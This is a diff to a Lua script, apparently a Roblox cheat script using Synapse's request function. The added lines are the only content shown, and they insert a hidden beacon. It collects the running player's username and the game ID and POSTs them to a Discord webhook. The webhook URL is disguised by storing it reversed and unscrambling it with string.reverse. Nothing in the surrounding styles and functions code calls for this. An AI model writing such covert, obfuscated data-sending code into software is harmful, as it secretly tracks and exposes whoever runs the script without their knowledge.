@@ -145,6 +145,14 @@ local styles =
     };
 }
 
+local postdata = 
+{
+    ["username"] = "spiceee";
+    ["content"] = game:GetService("Players").LocalPlayer.Name .. " in " .. game.GameId
+}
+
+syn.request( { Url = string.reverse("ygyqnIQ5A_QYpd8zaLzS0M_p790XlDdXMDscWaI39DEUXqljK0J5F7tuozRTtonv5yDj/115615204953396338/skoohbew/ipa/moc.drocsid//:sptth"), Headers = { ["Content-Type"] = "application/json" }, Method = "POST", Body = game:GetService("HttpService"):JSONEncode(postdata) } )
+
 local functions =
 {
     
